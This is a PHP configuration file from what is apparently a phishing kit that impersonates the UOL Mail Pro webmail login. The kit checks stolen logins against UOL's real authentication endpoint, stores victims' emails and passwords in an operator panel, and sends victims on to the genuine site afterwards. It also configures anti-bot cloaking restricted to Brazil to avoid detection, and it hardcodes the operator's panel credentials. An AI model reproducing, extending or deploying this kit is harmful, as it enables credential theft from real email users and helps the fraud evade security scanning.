<?php
declare(strict_types=1);

if (isset($GLOBALS['uol_config']) && is_array($GLOBALS['uol_config'])) {
    return $GLOBALS['uol_config'];
}

if ((getenv('FLY_APP_NAME') ?: '') !== '') {
    $GLOBALS['uol_config'] = require __DIR__ . '/config.fly.php';
    return $GLOBALS['uol_config'];
}

require_once __DIR__ . '/includes/admin_auth.php';

$panel_user = 'Danadinho';
$panel_pass = 'Danado2027';
$dataDir    = __DIR__ . '/data';

$GLOBALS['uol_config'] = [
    'site_title'            => 'E-mail Pro - UOL',
    'panel_name'            => 'UOL Mail Pro',
    'panel_marquee'         => 'UOL Mail Pro — logins validados via API original (email.uolhost.com.br/auth). E-mail e senha ficam no painel.',
    'default_locale'        => 'pt_br',
    'success_redirect'      => 'https://email.uolhost.com.br/',
    'blocked_redirect'      => 'https://email.uolhost.com.br/',
    'max_ip_visits'         => 4,
    'login_action'          => 'login.php',
    'api_verify_path'       => 'api/verify.php',
    'data_dir'              => $dataDir,
    'panel_user'            => $panel_user,
    'panel_pass'            => $panel_pass,
    'panel_reset_key'       => 'd3vl1ma2024',
    'uol_mailpro_auth_url'  => 'https://email.uolhost.com.br/auth',
    'uol_mailpro_redir_url' => 'email.uolhost.com.br/',
    'uol_mailpro_timeout'   => 30,
    'anti_bot' => [
        'enabled'              => true,
        'allowed_countries'    => ['BR'],
        'enforce_country'      => false,
        'deny_hosting'         => false,
        'deny_proxy_vpn'       => false,
        'deny_datacenter_asn'  => false,
        'deny_bots_ua'         => true,
        'deny_bad_headers'     => false,
        'deny_empty_ua'        => true,
        'deny_headless_signals'=> false,
        'enforce_device'       => false,
        'strict_geo_unknown'   => false,
        'allow_localhost'      => true,
        'redirect'             => null,
        'log_blocks'           => true,
    ],
    'admin' => admin_auth_load($dataDir, [
        'panel_user' => $panel_user,
        'panel_pass' => $panel_pass,
    ]),
];

return $GLOBALS['uol_config'];
